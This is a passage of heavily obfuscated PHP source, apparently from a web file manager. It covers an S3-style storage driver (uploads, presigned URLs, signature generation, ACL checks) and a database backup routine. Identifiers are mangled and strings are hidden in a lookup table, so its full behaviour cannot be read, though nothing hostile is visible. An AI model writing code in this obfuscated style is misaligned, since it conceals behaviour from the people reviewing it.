} if (count($Š‹‰ñØ) == 1 && $Š‹‰ñØ[0][$˜ş„½Ş¸[32]] == $Ô¨š°—Æ) { break; } if ($×òŸÄßÆ) { if (count($Š‹‰ñØ)) { $Š‹‰ñØ = array_column($Š‹‰ñØ, $˜ş„½Ş¸[32]); $èõ×ÑÏ = array_merge($èõ×ÑÏ, $Š‹‰ñØ); } if (count($¾÷çµşÃ)) { $¾÷çµşÃ = array_column($¾÷çµşÃ, $˜ş„½Ş¸[32]); $èˆåĞ÷İ = array_merge($èˆåĞ÷İ, $¾÷çµşÃ); } if ($ƒ¡¢¹ñ === null) { break; } continue; } if ($İÀ­™ô) { if (!empty($Š‹‰ñØ)) { if (count($Š‹‰ñØ) > 1 || isset($Š‹‰ñØ[0][$˜ş„½Ş¸[32]]) && $Š‹‰ñØ[0][$˜ş„½Ş¸[32]] != $Ô¨š°—Æ) { return !0; } } } else { if (!empty($¾÷çµşÃ)) { return !0; } } if ($ƒ¡¢¹ñ === null) { break; } } if ($×òŸÄßÆ) { $èõ×ÑÏ = array_diff($èõ×ÑÏ, array($Ô¨š°—Æ)); $èõ×ÑÏ = count(array_unique($èõ×ÑÏ)); $èˆåĞ÷İ = count(array_unique($èˆåĞ÷İ)); return array($˜ş„½Ş¸[241] => $èõ×ÑÏ, $˜ş„½Ş¸[242] => $èˆåĞ÷İ); } return !1; } public function listAll($’†ÈÙÉ) { $°»êşâ =& $_SERVER[´È¥ö†ö]; $˜Úµıã = $this->fileList($’†ÈÙÉ, $°»êşâ[12], !0); $ÂŞĞİ = array_to_keyvalue($˜Úµıã[$°»êşâ[86]], $°»êşâ[32]); foreach ($˜Úµıã[$°»êşâ[85]] as $ÊÈ‹ı‡€) { if (is_string($ÊÈ‹ı‡€)) { $ÂŞĞİ[$ÊÈ‹ı‡€] = array($°»êşâ[79] => 0); } } return $this->listAllFiles($’†ÈÙÉ, $ÂŞĞİ); } public function canRead($§ÕŒ×¯) { $ôõ¬ĞŠœ =& $_SERVER[´È¥ö†ö]; $¸˜ÀÇÎ = $this->client->getAccessControlPolicy($this->bucket, $§ÕŒ×¯); if (!$¸˜ÀÇÎ) { return !1; } return in_array($¸˜ÀÇÎ, array($ôõ¬ĞŠœ[243], $ôõ¬ĞŠœ[244], $ôõ¬ĞŠœ[245])) ? !0 : !1; } public function canWrite($³¿‡¯ÎÜ) { $šøÃñµ¹ =& $_SERVER[´È¥ö†ö]; $•–šû¤÷ = $this->client->getAccessControlPolicy($this->bucket, $³¿‡¯ÎÜ); if (!$•–šû¤÷) { return !1; } return in_array($•–šû¤÷, array($šøÃñµ¹[243], $šøÃñµ¹[244])) ? !0 : !1; } public function getContent($‚µö„ùó) { return $this->client->getObject($this->bucket, $‚µö„ùó); } public function setContent($©»ÆÓí, $§œ¤ó = '', $ •‡©ù… = false) { $şë€áÎ =& $_SERVER[´È¥ö†ö]; $©»ÆÓí = $ •‡©ù… ? trim($©»ÆÓí, $şë€áÎ[8]) . $şë€áÎ[8] : $©»ÆÓí; $‚øªÎÍè = get_file_mime(get_path_ext($©»ÆÓí)); $´Öµ¬ãÔ = $this->client->putObject($§œ¤ó, $this->bucket, $©»ÆÓí, $şë€áÎ[231], array(), $‚øªÎÍè); if (!$´Öµ¬ãÔ) { return !1; } if ($ •‡©ù…) { return !0; } return $´Öµ¬ãÔ ? !0 : !1; } public function fileSubstr($„‹ÓÉ×¥, $˜ë÷Àäá, $îÂâ“¯¿) { $Ä“÷ûş = $˜ë÷Àäá + $îÂâ“¯¿ - 1; return $this->client->getObject($this->bucket, $„‹ÓÉ×¥, array($_SERVER[´È¥ö†ö][246] => "\142\x79\164\145\x73\75{$˜ë÷Àäá}\55{$Ä“÷ûş}")); } public function upload($Ùå÷»ó×, $ã¸®Şì, $´áƒÕ§İ = false, $Ş¼É‚¸ = REPEAT_REPLACE) { $Ñ‹©â£Í =& $_SERVER[´È¥ö†ö]; $ÎÜ²Ô±§ = array($Ñ‹©â£Í[247] => @md5_file($ã¸®Şì)); $—ºÃ¤‘ = array($Ñ‹©â£Í[248] => get_file_mime(get_path_ext($Ùå÷»ó×))); if (IO::size($ã¸®Şì) <= 1024 * 1024 * 200) { $¶¦³Ñú = $this->client->putObjectFile($ã¸®Şì, $this->bucket, $Ùå÷»ó×, $Ñ‹©â£Í[231], $ÎÜ²Ô±§, $—ºÃ¤‘); return !empty($¶¦³Ñú) ? $this->getPathOuter($Ùå÷»ó×) : !1; } $Ë–À•£Â = $this->client->multiUploadObject($ã¸®Şì, $this->bucket, trim($Ùå÷»ó×, $Ñ‹©â£Í[8]), $ÎÜ²Ô±§, $—ºÃ¤‘); return $Ë–À•£Â ? $this->getPathOuter($Ùå÷»ó×) : !1; } public function download($¿ ª©ßÍ, $É»â³¶ø) { if (!@is_dir($this->pathFather($É»â³¶ø)) && !IO::mkdir($this->pathFather($É»â³¶ø))) { return !1; } $Ù¡îš˜ = $this->client->getObject($this->bucket, $¿ ª©ßÍ, array(), $É»â³¶ø); return $Ù¡îš˜ !== !1 ? $É»â³¶ø : !1; } public function link($úÑµëåş, $›´Ëú… = array()) { return $this->getPreSignedURL($úÑµëåş, 3600 * 12, $›´Ëú…); } private function getPreSignedURL($‡â•¬, $İ·½ñêÎ, $àºâÍÁñ = array(), $ãúÊ¾ ò = "\x47\105\124") { $ñ¢ÇÉçè =& $_SERVER[´È¥ö†ö]; $‡â•¬ = trim($‡â•¬, $ñ¢ÇÉçè[8]); if ($this->signVer == $ñ¢ÇÉçè[249]) { return $this->client->getPreSignedV2URL($this->bucket, $‡â•¬, $İ·½ñêÎ, $ãúÊ¾ ò, $àºâÍÁñ); } return $this->client->getPreSignedV4URL($this->bucket, $‡â•¬, $İ·½ñêÎ, array(), $ãúÊ¾ ò, $àºâÍÁñ); } public function fileOut($»üëÜÄ, $ı¨íÁÜ¥ = false, $üí™¢òæ = false, $Èˆè¶äÆ = '') { $‘ê™Œ¢ =& $_SERVER[´È¥ö†ö]; if ($this->isFileOutServer()) { return $this->fileOutServer($»üëÜÄ, $ı¨íÁÜ¥, $üí™¢òæ, $Èˆè¶äÆ); } if (!$üí™¢òæ) { $üí™¢òæ = $this->pathThis($»üëÜÄ); } $°”ª ‘ = get_file_mime(get_path_ext($üí™¢òæ)); if ($°”ª ‘ == $‘ê™Œ¢[250]) { return parent::fileOut($»üëÜÄ, $ı¨íÁÜ¥, $üí™¢òæ, $Èˆè¶äÆ); } $çşÄíÒÚ = array($‘ê™Œ¢[251] => $°”ª ‘); if ($ı¨íÁÜ¥) { $çşÄíÒÚ[$‘ê™Œ¢[252]] = $‘ê™Œ¢[253] . rawurlencode($üí™¢òæ); } else { } $¸­¾Á = $this->link($»üëÜÄ, $çşÄíÒÚ); $this->fileOutLink($¸­¾Á); } public function fileOutServer($ˆ²ÏçÕâ, $¡åêØ = false, $‡„©§í = false, $Â¦ıœ = '') { parent::fileOut($ˆ²ÏçÕâ, $¡åêØ, $‡„©§í, $Â¦ıœ); } public function fileOutImageServer($æ¦·ƒÑ, $ôëÌ®˜ = 250) { parent::fileOutImage($æ¦·ƒÑ, $ôëÌ®˜); } public function hashMd5($à¾²×ê€, $Ã¦¸ÉˆÍ = '') { $ùÉñ–Ü = $this->objectMeta($à¾²×ê€); if (!$ùÉñ–Ü) { return !1; } $Ã¦¸ÉˆÍ = $Ã¦¸ÉˆÍ ? $Ã¦¸ÉˆÍ : _get($ùÉñ–Ü, $_SERVER[´È¥ö†ö][254]); return $Ã¦¸ÉˆÍ; } public function uploadFormData($¯ŸÎ»œë, $İ†ÓúÉ = 3600) { $Òš‰ü‡ =& $_SERVER[´È¥ö†ö]; if (!$this->_isClientAsync()) { $“íÑƒšà = $this->getPreSignedURL($¯ŸÎ»œë, $İ†ÓúÉ, array(), $Òš‰ü‡[255]); return array($Òš‰ü‡[208] => str_replace($Òš‰ü‡[218], $Òš‰ü‡[256], $“íÑƒšà)); } if (isset($GLOBALS[$Òš‰ü‡[6]][$Òš‰ü‡[92]][$Òš‰ü‡[257]]) && $GLOBALS[$Òš‰ü‡[6]][$Òš‰ü‡[92]][$Òš‰ü‡[257]] == $Òš‰ü‡[230]) { return $this->uploadMultiData($¯ŸÎ»œë, $İ†ÓúÉ); } if ($this->signVer == $Òš‰ü‡[249]) { return $this->uploadFormDataV2($¯ŸÎ»œë, $İ†ÓúÉ); } return $this->uploadFormDataV4($¯ŸÎ»œë, $İ†ÓúÉ); } public function uploadFormDataV2($‘çÁä·¿, $Î„ÉÑÚÕ = 3600) { $Óå®ıóç =& $_SERVER[´È¥ö†ö]; $ìÇÚÎÚÖ = $this->pathFather($‘çÁä·¿); $ÊÜğ¿©“ = $this->client->getHttpUploadPostParams($this->bucket, $ìÇÚÎÚÖ, $Óå®ıóç[231], $Î„ÉÑÚÕ); $­šÊŞà = array_merge((array) $ÊÜğ¿©“, array($Óå®ıóç[258] => $Óå®ıóç[249], $Óå®ıóç[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($­šÊŞà[$Óå®ıóç[258]]); } return $­šÊŞà; } public function uploadFormDataV4($¸¦¯ğÑ, $Äˆ´ÉÍ = 3600) { $ˆ¿®ºÙ  =& $_SERVER[´È¥ö†ö]; $±ıÓ©‹ = $ˆ¿®ºÙ [231]; $¢ßØÜ¼ = $ˆ¿®ºÙ [259]; $Îßï—œÌ = $ˆ¿®ºÙ [62]; $ƒÑ˜ãí® = gmdate($ˆ¿®ºÙ [260]); $ñª¥È±Ñ = gmdate($ˆ¿®ºÙ [261]); $ºê‡ñ¼Æ = $ˆ¿®ºÙ [262]; $¬íÀš¿Å = $Äˆ´ÉÍ . $ˆ¿®ºÙ [12]; $ğÁ‚Ïï = $ˆ¿®ºÙ [263]; $›Ş–˜òÒ = array($this->accessKey, $ñª¥È±Ñ, $this->region, $Îßï—œÌ, $ºê‡ñ¼Æ); $—¯Âõ˜Ñ = implode($ˆ¿®ºÙ [8], $›Ş–˜òÒ); $ÜÁ±»„Ø = array($ˆ¿®ºÙ [264] => gmdate($ˆ¿®ºÙ [265], strtotime($ˆ¿®ºÙ [266])), $ˆ¿®ºÙ [267] => array(array($ˆ¿®ºÙ [268] => $this->bucket), array($ˆ¿®ºÙ [269], $ˆ¿®ºÙ [270], $ˆ¿®ºÙ [12]), array($ˆ¿®ºÙ [269], $ˆ¿®ºÙ [271], $ˆ¿®ºÙ [12]), array($ˆ¿®ºÙ [272] => $ğÁ‚Ïï), array($ˆ¿®ºÙ [273] => $—¯Âõ˜Ñ), array($ˆ¿®ºÙ [274] => $¢ßØÜ¼), array($ˆ¿®ºÙ [275] => $ƒÑ˜ãí®), array($ˆ¿®ºÙ [276] => $¬íÀš¿Å))); $òÄô­‰ò = base64_encode(json_encode($ÜÁ±»„Ø)); $ğíÑ¤áú = hash_hmac($ˆ¿®ºÙ [277], $ñª¥È±Ñ, $ˆ¿®ºÙ [278] . $this->secret, !0); $¥æºú±à = hash_hmac($ˆ¿®ºÙ [277], $this->region, $ğíÑ¤áú, !0); $×Ã¹óØ„ = hash_hmac($ˆ¿®ºÙ [277], $Îßï—œÌ, $¥æºú±à, !0); $²¸åİõÀ = hash_hmac($ˆ¿®ºÙ [277], $ºê‡ñ¼Æ, $×Ã¹óØ„, !0); $˜ßÕ¤—Ü = hash_hmac($ˆ¿®ºÙ [277], $òÄô­‰ò, $²¸åİõÀ); $Ò¹ù¥† = array($ˆ¿®ºÙ [248] => $ˆ¿®ºÙ [12], $ˆ¿®ºÙ [272] => $ğÁ‚Ïï, $ˆ¿®ºÙ [279] => $òÄô­‰ò, $ˆ¿®ºÙ [273] => $—¯Âõ˜Ñ, $ˆ¿®ºÙ [274] => $¢ßØÜ¼, $ˆ¿®ºÙ [275] => $ƒÑ˜ãí®, $ˆ¿®ºÙ [276] => $¬íÀš¿Å, $ˆ¿®ºÙ [280] => $˜ßÕ¤—Ü, $ˆ¿®ºÙ [258] => $ˆ¿®ºÙ [249], $ˆ¿®ºÙ [208] => $this->getHost()); if ($this->_isClientAsync()) { unset($Ò¹ù¥†[$ˆ¿®ºÙ [258]]); } return $Ò¹ù¥†; } public function uploadMultiData($‹Ìş‘Ê¯, $•ë¿ƒÉ¿ = 3600) { $ß½§Ë‘Ÿ =& $_SERVER[´È¥ö†ö]; $¹·³é¯ô = $this->signVer == $ß½§Ë‘Ÿ[249] ? gmdate($ß½§Ë‘Ÿ[281]) : gmdate($ß½§Ë‘Ÿ[282]); $Š–¤ïÓö = array(); $€íğÅç• = $this->client->getUploadId($this->bucket, $‹Ìş‘Ê¯, $Š–¤ïÓö); if (!$€íğÅç•) { return !1; } $éå»üã = array($ß½§Ë‘Ÿ[283] => $€íğÅç•, $ß½§Ë‘Ÿ[208] => $this->getHost() . $ß½§Ë‘Ÿ[8] . $this->pathEncode($‹Ìş‘Ê¯), $ß½§Ë‘Ÿ[284] => $¹·³é¯ô, $ß½§Ë‘Ÿ[97] => $‹Ìş‘Ê¯, $ß½§Ë‘Ÿ[258] => $this->signVer); if ($this->_isClientAsync()) { unset($éå»üã[$ß½§Ë‘Ÿ[258]]); } return $éå»üã; } public function uploadMultiAuth($çÛ®ºšì, $ÕÄè¶Øœ = array()) { $æÇŸÌ‚ =& $_SERVER[´È¥ö†ö]; if ($this->signVer == $æÇŸÌ‚[249]) { if (isset($ÕÄè¶Øœ[$æÇŸÌ‚[285]])) { return $this->uploadPartAuthV2($çÛ®ºšì, $ÕÄè¶Øœ); } return $this->uploadListAuthV2($çÛ®ºšì, $ÕÄè¶Øœ); } if (isset($ÕÄè¶Øœ[$æÇŸÌ‚[285]])) { return $this->uploadPartAuthV4($çÛ®ºšì, $ÕÄè¶Øœ); } return $this->uploadListAuthV4($çÛ®ºšì, $ÕÄè¶Øœ); } public function uploadPartAuthV2($¨™Øñ©é, $©ù½Õ²Ì = array()) { $ˆ‰ÁÄµÁ =& $_SERVER[´È¥ö†ö]; $Ì´¾ğĞÂ = $©ù½Õ²Ì[$ˆ‰ÁÄµÁ[97]]; $Ğìû¥É = gmdate($ˆ‰ÁÄµÁ[281]); $ÃŸ¸şõå = array_intersect_key($©ù½Õ²Ì, array_flip(array($ˆ‰ÁÄµÁ[285], $ˆ‰ÁÄµÁ[283]))); ksort($ÃŸ¸şõå); $•î½ºä = $ÃŸ¸şõå ? $ˆ‰ÁÄµÁ[76] . http_build_query($ÃŸ¸şõå, null, $ˆ‰ÁÄµÁ[286], PHP_QUERY_RFC3986) : $ˆ‰ÁÄµÁ[12]; $Ë³¤ê = array($ˆ‰ÁÄµÁ[255], $ˆ‰ÁÄµÁ[12], $ˆ‰ÁÄµÁ[123], $ˆ‰ÁÄµÁ[12], "\x78\55\x61\x6d\172\55\144\x61\x74\x65\72{$Ğìû¥É}", $ˆ‰ÁÄµÁ[8] . $this->bucket . $ˆ‰ÁÄµÁ[8] . $this->pathEncode($Ì´¾ğĞÂ) . $•î½ºä); $ê±³Ø¤ = implode($ˆ‰ÁÄµÁ[287], $Ë³¤ê); $Áìş‚¦ù = $this->client->__getSignature($ê±³Ø¤); return array($ˆ‰ÁÄµÁ[288] => $Áìş‚¦ù, $ˆ‰ÁÄµÁ[284] => $Ğìû¥É); } public function uploadListAuthV2($¬ÉÛ™éó, $´†–’æ› = array()) { $£ÜÅØ‰ö =& $_SERVER[´È¥ö†ö]; $ĞêŠéÉ’ = $´†–’æ›[$£ÜÅØ‰ö[97]]; $´ÅšùƒÈ = $´†–’æ›[$£ÜÅØ‰ö[283]]; $ØŒèÔ = $this->client->listParts($this->bucket, $ĞêŠéÉ’, $´ÅšùƒÈ); if (!$ØŒèÔ) { return !1; } $µ‘ ™–Ê = gmdate($£ÜÅØ‰ö[281]); $õÓÓ­× = $£ÜÅØ‰ö[289] . $´ÅšùƒÈ; $„–¨æ ¡ = array($£ÜÅØ‰ö[290], $£ÜÅØ‰ö[12], $£ÜÅØ‰ö[123], $£ÜÅØ‰ö[12], "\x78\55\x61\x6d\172\55\x64\x61\x74\145\x3a{$µ‘ ™–Ê}", $£ÜÅØ‰ö[8] . $this->bucket . $£ÜÅØ‰ö[8] . $this->pathEncode($ĞêŠéÉ’) . $õÓÓ­×); $›–öˆ“Ü = implode($£ÜÅØ‰ö[287], $„–¨æ ¡); $§‰Ÿ½É = $this->client->__getSignature($›–öˆ“Ü); return array($£ÜÅØ‰ö[288] => $§‰Ÿ½É, $£ÜÅØ‰ö[284] => $µ‘ ™–Ê, $£ÜÅØ‰ö[291] => $ØŒèÔ); } public function uploadPartAuthV4($î—…ˆæ, $¤Ùæ‘õ = array()) { $Û“³Ñ·ˆ =& $_SERVER[´È¥ö†ö]; $Œ˜–áÇÂ = $¤Ùæ‘õ[$Û“³Ñ·ˆ[97]]; $§‡‚Ö¦ş = array($Û“³Ñ·ˆ[275] => gmdate($Û“³Ñ·ˆ[282]), $Û“³Ñ·ˆ[292] => _get($¤Ùæ‘õ, $Û“³Ñ·ˆ[293], hash($Û“³Ñ·ˆ[277], $Û“³Ñ·ˆ[12]))); $°™¨óÔä = explode($Û“³Ñ·ˆ[210], $this->getHost()); $ØÜÈ² = array($Û“³Ñ·ˆ[294] => $°™¨óÔä[1], $Û“³Ñ·ˆ[295] => $Û“³Ñ·ˆ[12], $Û“³Ñ·ˆ[248] => $Û“³Ñ·ˆ[123], $Û“³Ñ·ˆ[296] => $¤Ùæ‘õ[$Û“³Ñ·ˆ[79]]); $ì÷¨µ˜¹ = $Û“³Ñ·ˆ[255]; $ªª ®„‡ = $Û“³Ñ·ˆ[8] . $this->pathEncode($Œ˜–áÇÂ); $÷³ÒÓ­ = array_intersect_key($¤Ùæ‘õ, array_flip(array($Û“³Ñ·ˆ[285], $Û“³Ñ·ˆ[283]))); $ÎØÎŞ»ï = $this->client->__getSignatureV4($§‡‚Ö¦ş, $ØÜÈ², $ì÷¨µ˜¹, $ªª ®„‡, $÷³ÒÓ­); return array($Û“³Ñ·ˆ[288] => $ÎØÎŞ»ï, $Û“³Ñ·ˆ[292] => $§‡‚Ö¦ş[$Û“³Ñ·ˆ[292]], $Û“³Ñ·ˆ[284] => $§‡‚Ö¦ş[$Û“³Ñ·ˆ[275]]); } public function uploadListAuthV4($‹‹­ ½, $õãÖğöğ = array()) { $ûöìßÒ =& $_SERVER[´È¥ö†ö]; $÷İ¢ÂÈ¤ = $õãÖğöğ[$ûöìßÒ[97]]; $ù¸¼¦¸ = $õãÖğöğ[$ûöìßÒ[283]]; $¦š¼åÛ… = $this->client->listParts($this->bucket, $÷İ¢ÂÈ¤, $ù¸¼¦¸); if (!$¦š¼åÛ…) { return !1; } $ÄĞ†€…é = $ûöìßÒ[297]; foreach ($¦š¼åÛ… as $¾ŸÔœãÕ) { $ÄĞ†€…é .= $ûöìßÒ[298] . "\74\x50\x61\x72\164\x4e\165\x6d\142\145\162\x3e{$¾ŸÔœãÕ[$ûöìßÒ[299]]}\74\x2f\x50\x61\x72\x74\x4e\165\155\x62\x65\x72\76\12" . "\74\105\124\x61\x67\x3e{$¾ŸÔœãÕ[$ûöìßÒ[300]]}\x3c\x2f\x45\124\141\x67\x3e\xa" . $ûöìßÒ[301]; } $ÄĞ†€…é .= $ûöìßÒ[302]; $§šÙ”˜ = array($ûöìßÒ[275] => gmdate($ûöìßÒ[282]), $ûöìßÒ[292] => hash($ûöìßÒ[277], $ÄĞ†€…é)); $œö‰°°È = explode($ûöìßÒ[210], $this->getHost()); $×³ûª¼ş = array($ûöìßÒ[294] => $œö‰°°È[1], $ûöìßÒ[248] => $ûöìßÒ[123], $ûöìßÒ[296] => strlen($ÄĞ†€…é)); $Ÿ£€‰´¥ = $ûöìßÒ[290]; $Úš É² = $ûöìßÒ[8] . $this->pathEncode($÷İ¢ÂÈ¤); $Î¾¹ = array($ûöìßÒ[283] => $ù¸¼¦¸); $µÚÒØıŠ = $this->client->__getSignatureV4($§šÙ”˜, $×³ûª¼ş, $Ÿ£€‰´¥, $Úš É², $Î¾¹); return array($ûöìßÒ[288] => $µÚÒØıŠ, $ûöìßÒ[292] => $§šÙ”˜[$ûöìßÒ[292]], $ûöìßÒ[284] => $§šÙ”˜[$ûöìßÒ[275]], $ûöìßÒ[291] => $¦š¼åÛ…); } private function _isClientAsync() { $âùÙ×Ê =& $_SERVER[´È¥ö†ö]; static $¥Èï¡Ü½ = null; if ($¥Èï¡Ü½ === null) { $ÇÄî£¡ = isset($_REQUEST[$âùÙ×Ê[303]]) ? json_decode($_REQUEST[$âùÙ×Ê[303]], !0) : !1; $¥Èï¡Ü½ = $ÇÄî£¡ && _get($ÇÄî£¡, $âùÙ×Ê[304]) == $âùÙ×Ê[305]; } return $¥Èï¡Ü½; } public function getHost() { $È›•–’ç =& $_SERVER[´È¥ö†ö]; $â¥ŒìŒ‘ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($È›•–’ç[70], $È›•–’ç[64], $È›•–’ç[69], $È›•–’ç[62]))) { return $â¥ŒìŒ‘ . $È›•–’ç[8] . $this->bucket; } if ($this->osType == $È›•–’ç[62] && !is_domain($â¥ŒìŒ‘)) { return $â¥ŒìŒ‘ . $È›•–’ç[8] . $this->bucket; } $â¥ŒìŒ‘ = explode($È›•–’ç[210], $â¥ŒìŒ‘); return $â¥ŒìŒ‘[0] . $È›•–’ç[210] . $this->bucket . $È›•–’ç[10] . $â¥ŒìŒ‘[1]; } public function size($»ş­¥”±) { $ï¿¼èáµ = $this->objectMeta($»ş­¥”±); return $ï¿¼èáµ ? $ï¿¼èáµ[$_SERVER[´È¥ö†ö][79]] : 0; } public function info($Çƒ²—¦ä) { if ($this->isFolder($Çƒ²—¦ä)) { return $this->folderInfo($Çƒ²—¦ä); } else { if ($this->isFile($Çƒ²—¦ä)) { return $this->fileInfo($Çƒ²—¦ä); } } return !1; } public function exist($±ªÑãâ) { return $this->isFile($±ªÑãâ) || $this->isFolder($±ªÑãâ); } public function isFile($¥œãàÖì) { return !$this->isFolder($¥œãàÖì) && $this->objectMeta($¥œãàÖì); } public function isFolder($£‘›ï†½) { return $this->cacheMethod($_SERVER[´È¥ö†ö][179], $£‘›ï†½); } protected function objectMeta($ñëàö¬) { return $this->cacheMethod($_SERVER[´È¥ö†ö][181], $ñëàö¬); } protected function _objectMeta($Ûı™ˆ¨ë) { $¬Ì¢Çùƒ =& $_SERVER[´È¥ö†ö]; $Ûı™ˆ¨ë = rtrim($Ûı™ˆ¨ë, $¬Ì¢Çùƒ[8]); try { $È½è®›ã = $this->client->getObjectInfo($this->bucket, $Ûı™ˆ¨ë); if (!isset($È½è®›ã[$¬Ì¢Çùƒ[254]]) && isset($È½è®›ã[$¬Ì¢Çùƒ[306]])) { $È½è®›ã[$¬Ì¢Çùƒ[254]] = $È½è®›ã[$¬Ì¢Çùƒ[306]]; } } catch (Exception $ä’¿õø‚) { $È½è®›ã = !1; } if (!$È½è®›ã) { } return $È½è®›ã; } protected function _isFolder($ÑôÆá²ì) { $İ´Ç‡¼¾ =& $_SERVER[´È¥ö†ö]; $ÑôÆá²ì = rtrim($ÑôÆá²ì, $İ´Ç‡¼¾[8]) . $İ´Ç‡¼¾[8]; if ($ÑôÆá²ì == $İ´Ç‡¼¾[12] || $ÑôÆá²ì == $İ´Ç‡¼¾[8]) { return !0; } $»Óı†ƒ™ = $this->client->getBucket($this->bucket, $ÑôÆá²ì, null, 1); if (empty($»Óı†ƒ™[$İ´Ç‡¼¾[238]])) { return !1; } $‡½”¥Şë = $»Óı†ƒ™[$İ´Ç‡¼¾[238]][0][$İ´Ç‡¼¾[32]]; return stripos($‡½”¥Şë, $ÑôÆá²ì) === 0 ? !0 : !1; if (substr($‡½”¥Şë, -1) == $İ´Ç‡¼¾[8]) { return !0; } if (get_path_this($‡½”¥Şë) == get_path_this($ÑôÆá²ì)) { return !1; } return !0; } public function listObject($’î‡©ÄÌ) { return $this->fileList($’î‡©ÄÌ, $_SERVER[´È¥ö†ö][12], !0); } } $_file = $_SERVER[$_SERVER[´È¥ö†ö][307]]; goto aëìš¸È…; cßä•­±¼Ñ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $†ëªùî™ =& $_SERVER[´È¥ö†ö]; $½íÁÓö = Backup::get(); self::$io = $½íÁÓö[$†ëªùî™[828]]; self::$name = $½íÁÓö[$†ëªùî™[32]]; $¬èôÊÙ = new DbManage(); $¦û¶†Ğ¸ = $¬èôÊÙ->dbType(); $ûÖÑô•Æ = array($†ëªùî™[853] => $¦û¶†Ğ¸, $†ëªùî™[854] => time()); Backup::set($ûÖÑô•Æ); $Ò£¦«õ = $this->tmpFilesPath() . $†ëªùî™[855] . self::$name . $†ëªùî™[8]; del_dir($Ò£¦«õ); mk_dir($Ò£¦«õ); $½÷Õƒö¤ = $Ìá÷¨¼¥ = 0; try { $İô€µŸ– = $¬èôÊÙ->db()->getTables(); } catch (Exception $®­ÃĞúà) { return !1; } $İô€µŸ– = array_diff($İô€µŸ–, array($†ëªùî™[856], $†ëªùî™[857])); foreach ($İô€µŸ– as $İØ©ƒ§ö) { if ($İØ©ƒ§ö == $†ëªùî™[858]) { continue; } $½÷Õƒö¤ += $¬èôÊÙ->model($İØ©ƒ§ö)->count(); } $¸’À«ò = new Task($†ëªùî™[859], $†ëªùî™[860], $½÷Õƒö¤, LNG($†ëªùî™[861]) . $†ëªùî™[862] . LNG($†ëªùî™[863])); $GLOBALS[$†ëªùî™[864]] = self::$name; foreach ($İô€µŸ– as $İØ©ƒ§ö) { $¬Áı = $Ò£¦«õ . $İØ©ƒ§ö . $†ëªùî™[865]; if ($İØ©ƒ§ö == $†ëªùî™[858]) { @touch($¬Áı); continue; } $¥¢®Ü = null; if ($İØ©ƒ§ö == $†ëªùî™[866] && $½íÁÓö[$†ëªùî™[171]] == $†ëªùî™[852]) { $¥¢®Ü = self::$io; } $Ìá÷¨¼¥ += $¬èôÊÙ->sqlFromDb($İØ©ƒ§ö, $¬Áı, $¸’À«ò, $¥¢®Ü); } unset($GLOBALS[$†ëªùî™[864]]); $¸’À«ò->end(); if ($Ìá÷¨¼¥ > $½÷Õƒö¤) { $½÷Õƒö¤ = $Ìá÷¨¼¥; } $ûÖÑô•Æ = array($†ëªùî™[853] => $¦û¶†Ğ¸, $†ëªùî™[849] => 1, $†ëªùî™[867] => $½÷Õƒö¤, $†ëªùî™[868] => $Ìá÷¨¼¥, $†ëªùî™[869] => time()); Backup::set($ûÖÑô•Æ); if ($½÷Õƒö¤ - $Ìá÷¨¼¥ > 0) { $‰Ê ¤øÅ = $†ëªùî™[870]; if (!stristr(I18n::getType(), $†ëªùî™[871])) { $‰Ê ¤øÅ = $†ëªùî™[872]; } write_log(array($‰Ê ¤øÅ, $ûÖÑô•Æ), $†ëªùî™[860]); return !1; } return !0; } private function tmpFilesPath() { $Òáü‰ªœ =& $_SERVER[´È¥ö†ö]; $úš—Ï¥“ = TEMP_FILES; if ($GLOBALS[$Òáü‰ªœ[6]][$Òáü‰ªœ[92]][$Òáü‰ªœ[873]]) { $úš—Ï¥“ = $GLOBALS[$Òáü‰ªœ[6]][$Òáü‰ªœ[92]][$Òáü‰ªœ[873]]; if (!mk_dir($úš—Ï¥“) || !is_writable($úš—Ï¥“) || !IO::mkfile($úš—Ï¥“ . $Òáü‰ªœ[874])) { $úš—Ï¥“ = TEMP_FILES; } } return $úš—Ï¥“; } } class BackupDbFile { public function __construct() { } public function index() { $Ú€ôâıÃ =& $_SERVER[´È¥ö†ö]; $„“ŸÕ˜† = Backup::get(); $ç§½›±£ = $„“ŸÕ˜†[$Ú€ôâıÃ[32]]; $²ĞØÏÔ = $this->tmpFilesPath() . "\142\x61\143\153\165\160\x5f{$ç§½›±£}\x2f"; $ÍóÜÛâ’ = $this->backupPath($„“ŸÕ˜†); if (!($ÍóÜÛâ’ = IO::mkdir($ÍóÜÛâ’))) { return !1; } $»ùËğ¡… = IO::listPath($²ĞØÏÔ); $ş™ÂñÛš = isset($»ùËğ¡…[$Ú€ôâıÃ[86]]) ? $»ùËğ¡…[$Ú€ôâıÃ[86]] : array(); $õ­şñÅŞ = array_sum(array_column($ş™ÂñÛš, $Ú€ôâıÃ[79])); if (!$õ­şñÅŞ) { return !1; } $ŸÜÄ•ø‘ = array($Ú€ôâıÃ[875] => $õ­şñÅŞ, $Ú€ôâıÃ[876] => time()); Backup::set($ŸÜÄ•ø‘); $†ã¦ĞØÖ = new TaskFileTransfer($Ú€ôâıÃ[877], $Ú€ôâıÃ[860], count($ş™ÂñÛš), LNG($Ú€ôâıÃ[861]) . $Ú€ôâıÃ[473] . LNG($Ú€ôâıÃ[863]) . $Ú€ôâıÃ[878]); $†ã¦ĞØÖ->task[$Ú€ôâıÃ[839]] = $õ­şñÅŞ; foreach ($»ùËğ¡…[$Ú€ôâıÃ[86]] as $€ ‚ÕØÆ) { $çÛóÈŞô = IO::move($€ ‚ÕØÆ[$Ú€ôâıÃ[87]], $ÍóÜÛâ’); if (!$çÛóÈŞô) { $†ã¦ĞØÖ->end(); $Îş¯ö° = IO::getLastError($Ú€ôâıÃ[879] . $€ ‚ÕØÆ[$Ú€ôâıÃ[87]] . $Ú€ôâıÃ[880] . $ÍóÜÛâ’ . $Ú€ôâıÃ[178]); write_log($Îş¯ö°, $Ú€ôâıÃ[860]); return !1; } } $ÃÒö³‡Û = new DbManage(); $òõàû§ˆ = $ÃÒö³‡Û->getSqlFile(); if (!$òõàû§ˆ[$Ú€ôâıÃ[881]] || !$òõàû§ˆ[$Ú€ôâıÃ[13]]) { return !1; } IO::move($òõàû§ˆ[$Ú€ôâıÃ[881]], $ÍóÜÛâ’); IO::move($òõàû§ˆ[$Ú€ôâıÃ[13]], $ÍóÜÛâ’); $†ã¦ĞØÖ->end(); $ŸÜÄ•ø‘ = 